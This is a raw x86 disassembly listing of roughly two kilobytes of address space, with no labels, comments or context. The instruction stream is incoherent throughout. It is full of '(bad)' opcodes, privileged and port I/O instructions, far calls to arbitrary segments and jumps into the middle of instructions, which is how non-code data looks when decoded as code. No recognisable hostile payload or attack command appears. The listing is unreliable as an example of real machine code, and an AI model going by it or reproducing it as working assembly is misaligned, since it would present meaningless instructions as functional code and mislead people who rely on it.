  6a6a48:	mov    al,BYTE PTR [eax]
  6a6a4a:	je     0x6a6a92
  6a6a4c:	pop    es
  6a6a4d:	lahf   
  6a6a4e:	lock mov dh,0x6d
  6a6a51:	or     eax,0x307a70b4
  6a6a56:	mov    ecx,0x78d2db3d
  6a6a5b:	cmc    
  6a6a5c:	xchg   BYTE PTR [edx+0x52],bh
  6a6a5f:	push   es
  6a6a60:	and    dh,dh
  6a6a62:	push   0xfffffffd
  6a6a64:	add    al,0x9
  6a6a66:	xlat   BYTE PTR ds:[ebx]
  6a6a67:	adc    ah,BYTE PTR [ebx-0x24]
  6a6a6a:	ins    BYTE PTR es:[edi],dx
  6a6a6b:	in     al,dx
  6a6a6c:	inc    eax
  6a6a6d:	inc    dx
  6a6a6f:	mov    edx,0x78c16fd1
  6a6a74:	jp     0x6a6af2
  6a6a76:	and    bl,BYTE PTR es:[eax+0x58650333]
  6a6a7d:	mov    ds:0x4df4ee61,al
  6a6a82:	add    DWORD PTR [edi+0x48e308f3],eax
  6a6a88:	ins    DWORD PTR es:[edi],dx
  6a6a89:	xchg   ebx,eax
  6a6a8a:	cmp    BYTE PTR [eax],cl
  6a6a8c:	add    eax,0x14a33de0
  6a6a91:	mov    cl,BYTE PTR [esi+0x53]
  6a6a94:	sub    DWORD PTR [ebp-0x191527cc],eax
  6a6a9a:	add    DWORD PTR [edx],ebx
  6a6a9c:	mov    ds:0xbc0dd107,al
  6a6aa1:	push   edi
  6a6aa2:	fwait
  6a6aa3:	pop    es
  6a6aa4:	clc    
  6a6aa5:	lods   eax,DWORD PTR ds:[esi]
  6a6aa6:	outs   dx,BYTE PTR ds:[esi]
  6a6aa7:	adc    DWORD PTR [eax-0x4e41c021],edi
  6a6aad:	mov    BYTE PTR [ebx],dl
  6a6aaf:	xchg   ebx,eax
  6a6ab0:	cli    
  6a6ab1:	mov    ebp,0x249b41ee
  6a6ab6:	pop    esi
  6a6ab7:	es adc ch,cl
  6a6aba:	mov    dh,0x18
  6a6abc:	rcl    DWORD PTR [esi+0x629d4e17],cl
  6a6ac2:	stc    
  6a6ac3:	and    BYTE PTR [ecx],bh
  6a6ac5:	xchg   esi,eax
  6a6ac6:	sbb    DWORD PTR [ecx-0x64],0xffffff84
  6a6aca:	clc    
  6a6acb:	jb     0x6a6b3f
  6a6acd:	cwde   
  6a6ace:	aas    
  6a6acf:	pusha  
  6a6ad0:	mov    BYTE PTR [ebp+0x65],bh
  6a6ad3:	pop    ss
  6a6ad4:	cmc    
  6a6ad5:	pop    ecx
  6a6ad6:	jg     0x6a6a9b
  6a6ad8:	jge    0x6a6b17
  6a6ada:	jecxz  0x6a6b56
  6a6adc:	fwait
  6a6add:	sbb    ah,al
  6a6adf:	les    ecx,FWORD PTR [ecx+0x1d]
  6a6ae2:	and    esp,DWORD PTR [edx]
  6a6ae4:	std    
  6a6ae5:	push   ds
  6a6ae6:	sbb    DWORD PTR gs:[esi],eax
  6a6ae9:	aas    
  6a6aea:	out    dx,eax
  6a6aeb:	add    eax,0x58a76022
  6a6af0:	inc    eax
  6a6af1:	addr16 loope 0x6a6a8d
  6a6af4:	pushf  
  6a6af5:	ins    BYTE PTR es:[edi],dx
  6a6af6:	mov    BYTE PTR [edx-0x1c],bh
  6a6af9:	fimul  DWORD PTR [edx]
  6a6afb:	loop   0x6a6ab5
  6a6afd:	adc    ah,bh
  6a6aff:	mov    cl,0x66
  6a6b01:	jne    0x6a6abe
  6a6b03:	je     0x6a6afd
  6a6b05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6a6b06:	pop    edx
  6a6b07:	repz and ch,BYTE PTR [edi-0x7c]
  6a6b0b:	ss aas 
  6a6b0d:	or     ch,BYTE PTR [edx-0x6d]
  6a6b10:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a6b11:	adc    al,0x1e
  6a6b13:	inc    ebp
  6a6b14:	sbb    DWORD PTR [ebx],eax
  6a6b16:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a6b17:	sub    al,ch
  6a6b19:	jae    0x6a6b83
  6a6b1b:	frstor [ebx-0x21]
  6a6b1e:	sub    al,0x57
  6a6b20:	sbb    ch,0xf6
  6a6b23:	dec    edx
  6a6b24:	leave  
  6a6b25:	ds cs push edx
  6a6b28:	sub    al,BYTE PTR [ecx]
  6a6b2a:	aas    
  6a6b2b:	inc    ebp
  6a6b2c:	mov    ds:0x624978d9,eax
  6a6b31:	sub    ch,BYTE PTR [ecx+0x4439d800]
  6a6b37:	and    dl,bh
  6a6b39:	mov    ch,0x18
  6a6b3b:	das    
  6a6b3c:	mov    ebp,0x205a26f5
  6a6b41:	add    edi,DWORD PTR [ecx]
  6a6b43:	xor    eax,0x8d2b0b12
  6a6b48:	sub    eax,0x636d6a1c
  6a6b4d:	enter  0xaa45,0x2f
  6a6b51:	xchg   esp,eax
  6a6b52:	dec    edi
  6a6b53:	lock cmp ebp,DWORD PTR [eax]
  6a6b56:	ins    BYTE PTR es:[edi],dx
  6a6b57:	sti    
  6a6b58:	mov    ah,0x76
  6a6b5a:	mov    ch,0x12
  6a6b5c:	sbb    ebx,eax
  6a6b5e:	or     DWORD PTR [eax-0x31],edx
  6a6b61:	cld    
  6a6b62:	cmc    
  6a6b63:	daa    
  6a6b64:	mov    esp,0x199149f5
  6a6b69:	call   esp
  6a6b6b:	jbe    0x6a6bc2
  6a6b6d:	inc    eax
  6a6b6e:	fisub  WORD PTR [esi+0x177d0870]
  6a6b74:	mov    al,al
  6a6b76:	fcom   QWORD PTR ds:0xf633c8cf
  6a6b7c:	jno    0x6a6bce
  6a6b7e:	das    
  6a6b7f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a6b80:	fld    QWORD PTR [edx+0x5b]
  6a6b83:	pop    ecx
  6a6b84:	ret    0xfd89
  6a6b87:	js     0x6a6bfb
  6a6b89:	xchg   ebp,eax
  6a6b8a:	sub    DWORD PTR [ebx],edi
  6a6b8c:	xchg   esi,eax
  6a6b8d:	fnstenv [ebx+eax*2+0x28]
  6a6b91:	fisttp DWORD PTR [edx]
  6a6b93:	dec    ebp
  6a6b94:	and    ecx,ebp
  6a6b96:	inc    edi
  6a6b97:	sbb    al,0x68
  6a6b99:	add    al,bl
  6a6b9b:	int3   
  6a6b9c:	mov    ebx,0x3b8525e
  6a6ba1:	push   ecx
  6a6ba2:	jl     0x6a6c0a
  6a6ba4:	and    eax,0x750cf3cc
  6a6ba9:	mov    ebx,0xec3f21a9
  6a6bae:	test   eax,0x1b24de46
  6a6bb3:	cmp    bl,BYTE PTR [ecx+0x339e718f]
  6a6bb9:	jecxz  0x6a6bdf
  6a6bbb:	addr16 dec edi
  6a6bbd:	ins    BYTE PTR es:[edi],dx
  6a6bbe:	push   edx
  6a6bbf:	mov    ds:0x5756a2c8,al
  6a6bc4:	jp     0x6a6c00
  6a6bc6:	cld    
  6a6bc7:	add    esp,DWORD PTR [esi-0x10]
  6a6bca:	je     0x6a6c25
  6a6bcc:	and    eax,DWORD PTR [ebp+0x11e812cf]
  6a6bd2:	ja     0x6a6bd3
  6a6bd4:	mul    eax
  6a6bd6:	pusha  
  6a6bd7:	in     eax,0x99
  6a6bd9:	sbb    ebp,0x586c34de
  6a6bdf:	rcr    esp,cl
  6a6be1:	arpl   WORD PTR [ecx],bx
  6a6be3:	inc    esp
  6a6be4:	fisttp QWORD PTR [ecx-0x730b3e7f]
  6a6bea:	sbb    BYTE PTR [ebx-0x53bedb86],0x29
  6a6bf1:	add    esp,DWORD PTR [ebx]
  6a6bf3:	and    ebx,edx
  6a6bf5:	fild   WORD PTR [edi]
  6a6bf7:	inc    esi
  6a6bf8:	shr    BYTE PTR [esi+ecx*2],0x8f
  6a6bfc:	(bad)  
  6a6bfd:	mov    cl,0x2b
  6a6bff:	adc    DWORD PTR [ebx],0x91c2dc0d
  6a6c05:	push   esp
  6a6c06:	into   
  6a6c07:	daa    
  6a6c08:	push   ss
  6a6c09:	mov    al,0xe7
  6a6c0b:	int3   
  6a6c0c:	and    bl,BYTE PTR [edi]
  6a6c0e:	enter  0x65d3,0xc0
  6a6c12:	push   0xdfbaab19
  6a6c17:	into   
  6a6c18:	out    0x54,eax
  6a6c1a:	xlat   BYTE PTR ds:[ebx]
  6a6c1b:	cmp    esp,edi
  6a6c1d:	jne    0x6a6c48
  6a6c1f:	bnd jle 0x6a6c07
  6a6c22:	push   eax
  6a6c23:	and    ebx,esp
  6a6c25:	xchg   ebx,eax
  6a6c26:	mov    WORD PTR [ecx],ss
  6a6c28:	movups xmm7,XMMWORD PTR [esi-0x52]
  6a6c2c:	(bad)  
  6a6c2d:	loope  0x6a6c6b
  6a6c2f:	nop
  6a6c30:	call   0x4078181c
  6a6c35:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a6c36:	sub    eax,0xf0b0b78a
  6a6c3b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6a6c3c:	neg    DWORD PTR [ecx]
  6a6c3e:	sbb    BYTE PTR [ecx+0x19c2afa0],0xe7
  6a6c45:	fidivr WORD PTR [ebp-0xb]
  6a6c48:	iret   
  6a6c49:	pmullw mm6,QWORD PTR [ebx-0x6fb2bb6e]
  6a6c50:	jp     0x6a6c4b
  6a6c52:	test   DWORD PTR [edi+0x5a],ebp
  6a6c55:	sub    DWORD PTR [ebx+0x5fe1da6a],0xe11cc7eb
  6a6c5f:	aaa    
  6a6c60:	popf   
  6a6c61:	lods   eax,DWORD PTR ds:[esi]
  6a6c62:	rcr    esp,0xe0
  6a6c65:	(bad)  
  6a6c66:	dec    eax
  6a6c67:	into   
  6a6c68:	iret   
  6a6c69:	sbb    ah,ch
  6a6c6b:	push   ebx
  6a6c6c:	es cmp eax,0x4263bfc7
  6a6c72:	sub    al,0xb2
  6a6c74:	retf   
  6a6c75:	or     edx,DWORD PTR [edi+0x32]
  6a6c78:	or     dl,BYTE PTR [esi-0x303c2103]
  6a6c7e:	adc    BYTE PTR ds:0xe8049e71,bl
  6a6c84:	unpckhps xmm2,xmm4
  6a6c87:	inc    edi
  6a6c88:	push   es
  6a6c89:	inc    edx
  6a6c8a:	jmp    0x929c1ae5
  6a6c8f:	inc    esp
  6a6c90:	pop    eax
  6a6c91:	add    eax,0xd58e215c
  6a6c96:	(bad)  
  6a6c97:	jo     0x6a6c73
  6a6c99:	push   0x5c424097
  6a6c9e:	xchg   DWORD PTR [edi+0x65],ebx
  6a6ca1:	hlt    
  6a6ca2:	cli    
  6a6ca3:	ror    BYTE PTR [eax],cl
  6a6ca5:	pushf  
  6a6ca6:	sbb    eax,0x2e3ed0ce
  6a6cab:	mov    cl,0x80
  6a6cad:	leave  
  6a6cae:	jp     0x6a6d04
  6a6cb0:	out    dx,al
  6a6cb1:	mov    cl,0x84
  6a6cb3:	and    dh,BYTE PTR ds:0x6371a1e3
  6a6cb9:	scas   al,BYTE PTR es:[edi]
  6a6cba:	mov    ds:0x997dbfe0,eax
  6a6cc0:	push   edx
  6a6cc1:	jl     0x6a6ce6
  6a6cc3:	lea    ebp,[ebx]
  6a6cc5:	(bad)  
  6a6cc6:	test   BYTE PTR [eax],0xd7
  6a6cc9:	enter  0x7de0,0x15
  6a6ccd:	jnp    0x6a6d0d
  6a6ccf:	inc    ebx
  6a6cd0:	jl     0x6a6cca
  6a6cd2:	pop    esi
  6a6cd3:	pusha  
  6a6cd4:	cli    
  6a6cd5:	mov    esi,0xd5973a0e
  6a6cda:	xor    eax,0xbcaddace
  6a6cdf:	adc    DWORD PTR ds:0xda2295b6,ecx
  6a6ce5:	out    0x55,al
  6a6ce7:	xchg   ecx,eax
  6a6ce8:	mov    bl,0xfe
  6a6cea:	mov    ebx,0x14ce4c91
  6a6cef:	jnp    0x6a6cf2
  6a6cf1:	jle    0x6a6c92
  6a6cf3:	lock fchs 
  6a6cf6:	pop    ecx
  6a6cf7:	aam    0xf
  6a6cf9:	dec    eax
  6a6cfa:	cmp    DWORD PTR [ebp-0x6185584b],ebx
  6a6d00:	loopne 0x6a6ca8
  6a6d02:	add    ah,BYTE PTR [esi]
  6a6d04:	lea    ebx,[edi]
  6a6d06:	xor    BYTE PTR [edi-0x1d10256c],dl
  6a6d0c:	fdivrp st(1),st
  6a6d0e:	int3   
  6a6d0f:	sub    eax,0x4aa5f64d
  6a6d14:	pop    edx
  6a6d15:	pop    eax
  6a6d16:	or     DWORD PTR [esi-0x73],esi
  6a6d19:	int3   
  6a6d1a:	xor    eax,0x43107d0e
  6a6d1f:	cli    
  6a6d20:	(bad)  
  6a6d21:	js     0x6a6d32
  6a6d23:	jmp    0xd7d5:0x262d2084
  6a6d2a:	push   0x3ddc66a9
  6a6d2f:	sbb    eax,0x2f34348
  6a6d34:	xor    eax,0x65d7cd84
  6a6d39:	and    esp,edx
  6a6d3b:	(bad)  
  6a6d3c:	cmp    ah,al
  6a6d3e:	fucomip st,st(1)
  6a6d40:	mov    ecx,0x6e62f55d
  6a6d45:	add    BYTE PTR [ebp+0x20],0xb4
  6a6d49:	cmp    al,0x14
  6a6d4b:	pop    ebx
  6a6d4c:	mov    DWORD PTR [eax-0x2b42ddf8],esp
  6a6d52:	add    DWORD PTR ds:0xb3e40ab8,edi
  6a6d58:	jg     0x6a6dbb
  6a6d5a:	xchg   edi,eax
  6a6d5b:	gs int 0x2f
  6a6d5e:	fidiv  WORD PTR [eax+0x6efbeb27]
  6a6d64:	ins    BYTE PTR es:[edi],dx
  6a6d65:	add    BYTE PTR [ecx+0x58],0x47
  6a6d69:	loope  0x6a6da7
  6a6d6b:	mov    edx,0x311734a2
  6a6d70:	shl    DWORD PTR es:[ebx],cl
  6a6d73:	pop    ss
  6a6d74:	push   esp
  6a6d75:	dec    esi
  6a6d76:	jo     0x6a6d85
  6a6d78:	pop    es
  6a6d79:	dec    ebp
  6a6d7a:	stc    
  6a6d7b:	adc    al,0x95
  6a6d7d:	jmp    0x600e076
  6a6d82:	dec    eax
  6a6d83:	cmp    bh,BYTE PTR [edi+0x1e]
  6a6d86:	push   esp
  6a6d87:	adc    al,0x79
  6a6d89:	dec    ebp
  6a6d8a:	jno    0x6a6d26
  6a6d8c:	push   ss
  6a6d8d:	push   edi
  6a6d8e:	xchg   edx,eax
  6a6d8f:	adc    ebx,DWORD PTR [eax-0x530a5fd0]
  6a6d95:	stos   BYTE PTR es:[edi],al
  6a6d96:	imul   ecx,DWORD PTR [ecx],0xc8f58a90
  6a6d9c:	lods   eax,DWORD PTR ds:[esi]
  6a6d9d:	push   es
  6a6d9e:	mov    bh,0x9f
  6a6da0:	mov    esi,0x55436a4f
  6a6da5:	jmp    0x6a6dc9
  6a6da7:	and    BYTE PTR [ecx-0xf904dfb],dl
  6a6dad:	jl     0x6a6d72
  6a6daf:	adc    eax,0x66d3625c
  6a6db4:	cs mov ah,0x16
  6a6db7:	aas    
  6a6db8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a6db9:	or     eax,0xc42ef6b6
  6a6dbe:	int3   
  6a6dbf:	push   0xffffffb6
  6a6dc1:	xchg   edx,eax
  6a6dc2:	in     al,0xe6
  6a6dc4:	sbb    esp,0x29d4471d
  6a6dca:	lods   eax,DWORD PTR ds:[esi]
  6a6dcb:	clc    
  6a6dcc:	call   0xb8c4:0x2099d2b9
  6a6dd3:	cld    
  6a6dd4:	je     0x6a6d5e
  6a6dd6:	push   esp
  6a6dd7:	lods   al,BYTE PTR ds:[esi]
  6a6dd8:	nop
  6a6dd9:	ds push cs
  6a6ddb:	rol    BYTE PTR [eax+esi*2-0x14d90531],0xb1
  6a6de3:	jecxz  0x6a6d95
  6a6de5:	jmp    0x6a6e2e
  6a6de7:	jbe    0x6a6d83
  6a6de9:	fwait
  6a6dea:	add    BYTE PTR [esi],ch
  6a6dec:	adc    al,0xf1
  6a6dee:	cdq    
  6a6def:	pop    ecx
  6a6df0:	xchg   DWORD PTR [esi+0x67a87a65],edi
  6a6df6:	div    BYTE PTR [esi+0x6e]
  6a6df9:	fucomi st,st(0)
  6a6dfb:	pop    es
  6a6dfc:	clc    
  6a6dfd:	ds xor esi,ebx
  6a6e00:	mov    esi,0xde84d20
  6a6e05:	jo     0x6a6d8e
  6a6e07:	fcmovu st,st(6)
  6a6e09:	mov    dh,BYTE PTR [ebx-0x669d6bee]
  6a6e0f:	mov    ds:0xd3e5a258,al
  6a6e14:	cwde   
  6a6e15:	inc    esp
  6a6e16:	mov    al,ds:0xc646cac
  6a6e1b:	fsub   QWORD PTR [eax+0x5b]
  6a6e1e:	jo     0x6a6df5
  6a6e20:	aaa    
  6a6e21:	mov    al,bh
  6a6e23:	vmulsd xmm7{k5}{z},xmm0,QWORD PTR [ecx-0x75240036]
  6a6e2d:	lea    esi,[ecx-0x6ffdae74]
  6a6e33:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a6e34:	or     edx,DWORD PTR [esi]
  6a6e36:	adc    al,0xca
  6a6e38:	sub    dh,BYTE PTR [ecx+0x11]
  6a6e3b:	inc    eax
  6a6e3c:	adc    DWORD PTR [esi+0x2ec3f30b],ebx
  6a6e42:	jnp    0x6a6e85
  6a6e44:	xor    esp,DWORD PTR [edx-0x5c]
  6a6e47:	clc    
  6a6e48:	clc    
  6a6e49:	adc    bh,BYTE PTR [ebx+edx*4-0x57]
  6a6e4d:	xchg   edx,eax
  6a6e4e:	sahf   
  6a6e4f:	sbb    cl,BYTE PTR [eax+0x6971e5ac]
  6a6e55:	fldenv es:[esi-0xedab685]
  6a6e5c:	cmp    cl,BYTE PTR [ecx-0xb]
  6a6e5f:	fistp  WORD PTR [edi+0x5c]
  6a6e62:	and    al,cl
  6a6e64:	sbb    eax,0x55f8e2ff
  6a6e69:	retf   
  6a6e6a:	push   ebx
  6a6e6b:	dec    eax
  6a6e6c:	mov    DWORD PTR [esi-0x26],ebp
  6a6e6f:	dec    ecx
  6a6e70:	add    eax,0x766c32ea
  6a6e75:	xor    ecx,esp
  6a6e77:	xor    edx,DWORD PTR [esi+0x7cefdf05]
  6a6e7d:	and    al,BYTE PTR [edi+0x76cf236b]
  6a6e83:	sbb    ebp,edx
  6a6e85:	mov    ebx,0xc758444d
  6a6e8a:	fld    QWORD PTR [eax-0x3ddb68d1]
  6a6e90:	mov    edi,0x3de0bbb3
  6a6e95:	leave  
  6a6e96:	das    
  6a6e97:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6a6e98:	test   DWORD PTR [ebx-0x1b02afe2],ebx
  6a6e9e:	mov    ds:0x519ab172,al
  6a6ea3:	mov    ch,0x6b
  6a6ea5:	push   esp
  6a6ea6:	cs (bad) 
  6a6ea8:	bnd call 0xbc23d31c
  6a6eae:	sub    ecx,ebp
  6a6eb0:	mov    eax,ds:0x7c71f52a
  6a6eb5:	(bad)  
  6a6eb6:	mov    dh,0xc9
  6a6eb8:	jnp    0x6a6f13
  6a6eba:	mov    ebp,0xb2fd1bac
  6a6ebf:	mov    dl,ah
  6a6ec1:	dec    ebx
  6a6ec2:	popa   
  6a6ec3:	ds sub eax,0x62074e0f
  6a6ec9:	aas    
  6a6eca:	add    BYTE PTR [ecx],0x95
  6a6ecd:	or     DWORD PTR [ebp+eiz*4-0x60da9cff],esp
  6a6ed4:	and    cl,ch
  6a6ed6:	and    DWORD PTR [ecx+0x17acec42],ebp
  6a6edc:	call   0x68b38dc7
  6a6ee1:	cmp    eax,0xf62067ef
  6a6ee6:	xchg   ecx,eax
  6a6ee7:	pop    ebx
  6a6ee8:	in     eax,0x9f
  6a6eea:	push   ecx
  6a6eeb:	cwde   
  6a6eec:	jmp    0x6a6f6a
  6a6eee:	imul   ecx,DWORD PTR [ecx],0x6
  6a6ef1:	arpl   sp,sp
  6a6ef3:	or     DWORD PTR [edi+ebx*4-0xb0a17e0],eax
  6a6efa:	aam    0x4d
  6a6efc:	mov    BYTE PTR [edi+edx*4+0x4c],dl
  6a6f00:	cmp    bl,0x28
  6a6f03:	mov    eax,0x1435503
  6a6f08:	je     0x6a6f4d
  6a6f0a:	lock (bad) 
  6a6f0c:	sbb    esp,ebx
  6a6f0e:	jg     0x6a6ea6
  6a6f10:	pop    ecx
  6a6f11:	ins    BYTE PTR es:[edi],dx
  6a6f12:	and    esp,ebp
  6a6f14:	out    dx,eax
  6a6f15:	and    edi,DWORD PTR [ecx+0x1726be5e]
  6a6f1b:	jmp    0x70bd5555
  6a6f20:	jecxz  0x6a6f8d
  6a6f22:	daa    
  6a6f23:	mov    ch,0x22
  6a6f25:	sub    DWORD PTR [ecx],ecx
  6a6f27:	mov    ah,0x36
  6a6f29:	bound  edx,QWORD PTR [ecx-0x3818839b]
  6a6f2f:	sbb    ebp,DWORD PTR [ebp+0x8b55752]
  6a6f35:	pop    ebx
  6a6f36:	daa    
  6a6f37:	inc    ebx
  6a6f38:	mov    ecx,0x65a9ccbf
  6a6f3d:	imul   ebp,DWORD PTR [edx+0x71],0xb0c4c710
  6a6f44:	xchg   edx,eax
  6a6f45:	xor    ecx,DWORD PTR [eax+0x12271a94]
  6a6f4b:	mov    ebp,0xe3371e4f
  6a6f50:	xchg   DWORD PTR [edi-0x53],edi
  6a6f53:	mov    eax,ds:0xb1043b19
  6a6f58:	(bad)  
  6a6f59:	fmul   DWORD PTR [ebx-0x830d48f]
  6a6f5f:	test   BYTE PTR [ebx-0x3b],0x6b
  6a6f63:	popa   
  6a6f64:	das    
  6a6f65:	test   BYTE PTR [ecx+0x6119382e],dh
  6a6f6b:	jmp    0xcec4:0x9c6f22b2
  6a6f72:	(bad)  
  6a6f73:	sar    BYTE PTR [eax+0x3e3a2fff],cl
  6a6f79:	je     0x6a6fee
  6a6f7b:	pop    es
  6a6f7c:	jno    0x6a6f73
  6a6f7e:	je     0x6a6fac
  6a6f80:	mov    al,0xa5
  6a6f82:	jo     0x6a6f59
  6a6f84:	nop
  6a6f85:	xchg   DWORD PTR [ebx+0x24362cd0],eax
  6a6f8b:	mov    dh,0xf0
  6a6f8d:	jae    0x6a6fcc
  6a6f8f:	mov    WORD PTR [ecx],gs
  6a6f91:	inc    eax
  6a6f92:	cmp    BYTE PTR [ebp-0x43],al
  6a6f95:	repz and edx,DWORD PTR [eax+ebp*4]
  6a6f99:	call   0x827f4588
  6a6f9e:	sahf   
  6a6f9f:	ins    BYTE PTR es:[edi],dx
  6a6fa0:	scas   eax,DWORD PTR es:[edi]
  6a6fa1:	mov    ds:0xc1292085,al
  6a6fa6:	in     eax,0xe0
  6a6fa8:	outs   dx,DWORD PTR ds:[esi]
  6a6fa9:	xchg   edi,eax
  6a6faa:	mov    bh,0x61
  6a6fac:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a6fad:	pop    ss
  6a6fae:	cwde   
  6a6faf:	shr    BYTE PTR [ecx],0xe1
  6a6fb2:	enter  0x9435,0xd5
  6a6fb6:	pop    ecx
  6a6fb7:	dec    ebp
  6a6fb8:	(bad)  
  6a6fb9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6a6fba:	sti    
  6a6fbb:	in     al,0x26
  6a6fbd:	push   esp
  6a6fbe:	pusha  
  6a6fbf:	int    0xbd
  6a6fc1:	neg    DWORD PTR [ebx+0x7c]
  6a6fc4:	fwait
  6a6fc5:	jne    0x6a6fd6
  6a6fc7:	(bad)  
  6a6fc8:	in     eax,dx
  6a6fc9:	add    cl,BYTE PTR [eax]
  6a6fcb:	pop    es
  6a6fcc:	lahf   
  6a6fcd:	(bad)  
  6a6fce:	xchg   edx,eax
  6a6fcf:	lock add bh,al
  6a6fd2:	inc    edi
  6a6fd3:	int    0x7d
  6a6fd5:	call   0xadcb:0x42fe52b4
  6a6fdc:	and    BYTE PTR [edx],cl
  6a6fde:	cmp    bh,BYTE PTR [esp+eiz*2]
  6a6fe1:	inc    esi
  6a6fe2:	mov    eax,0x88d4c35c
  6a6fe7:	jns    0x6a701a
  6a6fe9:	nop
  6a6fea:	test   DWORD PTR [esi-0xe95d681],esp
  6a6ff0:	das    
  6a6ff1:	push   esp
  6a6ff2:	push   esi
  6a6ff3:	sqrtps xmm7,xmm7
  6a6ff6:	cld    
  6a6ff7:	xchg   esi,eax
  6a6ff8:	sub    eax,0x3a67056b
  6a6ffd:	pop    ecx
  6a6ffe:	push   edx
  6a6fff:	sub    bh,cl
  6a7001:	aaa    
  6a7002:	or     DWORD PTR [ebx+0x35],ecx
  6a7005:	mov    bl,0x21
  6a7007:	mov    DWORD PTR [ebp+ecx*1+0x4c34d034],ebx
  6a700e:	mov    ds:0xe7877e2e,al
  6a7013:	popf   
  6a7014:	gs in  eax,0x42
  6a7017:	(bad)  
  6a7018:	jb     0x6a701d
  6a701a:	pop    esp
  6a701b:	js     0x6a7092
  6a701d:	fwait
  6a701e:	mov    dl,0xfb
  6a7020:	mov    ecx,0x7987fc83
  6a7025:	jae    0x6a6faf
  6a7027:	(bad)  
  6a7029:	stos   BYTE PTR es:[edi],al
  6a702a:	xchg   DWORD PTR [edi+0x1db2be1a],esi
  6a7030:	das    
  6a7031:	enter  0xc686,0x61
  6a7035:	(bad)  
  6a7036:	jp     0x6a6ff4
  6a7038:	loope  0x6a70b0
  6a703a:	dec    esp
  6a703b:	mov    ch,0xc2
  6a703d:	enter  0xaf5b,0xf5
  6a7041:	pop    ecx
  6a7042:	mov    eax,ds:0xb39c9a0c
  6a7047:	inc    esi
  6a7048:	mov    WORD PTR [edx+0x347f483a],?
  6a704e:	call   0x87a6:0xf5439a79
  6a7055:	xor    bl,BYTE PTR [edi-0x10]
  6a7058:	adc    BYTE PTR [eax+0xeb5c13d],ah
  6a705e:	mov    ecx,0xd11b3fd6
  6a7063:	push   eax
  6a7064:	pop    ebx
  6a7065:	or     BYTE PTR [edx+ebx*4+0x70],bh
  6a7069:	loope  0x6a703b
  6a706b:	(bad)  
  6a706c:	in     al,0x63
  6a706e:	mov    WORD PTR [edx+ecx*4+0x0],?
  6a7072:	shl    DWORD PTR [ebp+esi*8-0x4dbfa4a2],0x4c
  6a707a:	loop   0x6a70e6
  6a707c:	adc    BYTE PTR [esi-0x21],0x62
  6a7080:	mov    BYTE PTR [eax],dl
  6a7082:	int3   
  6a7083:	cmp    bl,BYTE PTR [ebp-0x13aae969]
  6a7089:	jmp    0x9c89ed02
  6a708e:	fist   DWORD PTR [edi+0x66]
  6a7091:	and    al,0xa6
  6a7093:	inc    ecx
  6a7094:	and    cl,BYTE PTR [ecx-0x274dcb4e]
  6a709a:	call   0x653a0965
  6a709f:	loopne 0x6a710c
  6a70a1:	jmp    0x6a70d7
  6a70a3:	jo     0x6a70c5
  6a70a5:	add    BYTE PTR [esp+esi*1-0x3a39afb8],cl
  6a70ac:	add    ebx,DWORD PTR [edx-0x13cdc46]
  6a70b2:	mov    edx,0x4afe0a3b
  6a70b7:	imul   ebx,DWORD PTR [edx],0x16a100fc
  6a70bd:	sbb    eax,0x62910bb3
  6a70c2:	shl    al,1
  6a70c4:	test   bh,al
  6a70c6:	pop    ss
  6a70c7:	xchg   ebx,eax
  6a70c8:	and    bh,ch
  6a70ca:	mov    eax,0xcdfd559d
  6a70cf:	icebp  
  6a70d0:	das    
  6a70d1:	ins    DWORD PTR es:[edi],dx
  6a70d2:	pushf  
  6a70d3:	push   cs
  6a70d4:	icebp  
  6a70d5:	and    esp,eax
  6a70d7:	popf   
  6a70d8:	dec    edi
  6a70d9:	in     eax,dx
  6a70da:	retf   0x3b66
  6a70dd:	cmp    al,0xc7
  6a70df:	nop
  6a70e0:	push   cs
  6a70e1:	pop    ecx
  6a70e2:	pop    edi
  6a70e3:	jae    0x6a70ea
  6a70e5:	cs xchg esp,eax
  6a70e7:	xchg   esp,eax
  6a70e8:	jne    0x6a714c
  6a70ea:	fdivr  DWORD PTR [ecx+0x7f4524e1]
  6a70f0:	push   edi
  6a70f1:	sub    DWORD PTR [ebx-0x18],ebp
  6a70f4:	ret    0x8449
  6a70f7:	push   esp
  6a70f8:	mov    esp,0xfc8006fa
  6a70fd:	push   es
  6a70fe:	into   
  6a70ff:	mov    ebx,0x5a550ecd
  6a7104:	mov    ds:0xeb397f1d,eax
  6a7109:	data16 stc 
  6a710b:	cmp    al,BYTE PTR [ecx+0x7ed19b2f]
  6a7111:	mov    cl,0x8f
  6a7113:	sbb    dl,bl
  6a7115:	sub    DWORD PTR [ecx],edi
  6a7117:	pop    eax
  6a7118:	out    dx,al
  6a7119:	and    DWORD PTR ds:0x99ba4c3f,ecx
  6a711f:	(bad)  
  6a7120:	fidiv  WORD PTR [eax+0x70]
  6a7123:	stos   DWORD PTR es:[edi],eax
  6a7124:	fmul   DWORD PTR [edi+eax*4+0x2abd3bad]
  6a712b:	mov    cl,0x82
  6a712d:	cld    
  6a712e:	mov    dh,0xc7
  6a7130:	sti    
  6a7131:	push   0xd44816e3
  6a7136:	push   ds
  6a7137:	or     bl,al
  6a7139:	sub    al,0x4b
  6a713b:	int    0xb
  6a713d:	call   0x5e71:0x8a3bc8a1
  6a7144:	imul   edx
  6a7146:	out    dx,al
  6a7147:	jg     0x6a7193
  6a7149:	xor    DWORD PTR [ebx],0xd2b04f0c
  6a714f:	rcr    BYTE PTR [ebx],cl
  6a7151:	mov    bl,0x1a
  6a7153:	cdq    
  6a7154:	mov    dh,0x72
  6a7156:	mov    ah,0xbb
  6a7158:	mov    esp,0x1a5d7cf8
  6a715d:	int3   
  6a715e:	ror    BYTE PTR ds:0x1a1782f4,0x7d
  6a7165:	pop    es
  6a7166:	cli    
  6a7167:	mov    ebx,DWORD PTR [eax-0x6d]
  6a716a:	cmp    esp,DWORD PTR [eax]
  6a716c:	xchg   DWORD PTR [esi],ebp
  6a716e:	or     BYTE PTR [eax+0x2b],dl
  6a7171:	in     eax,dx
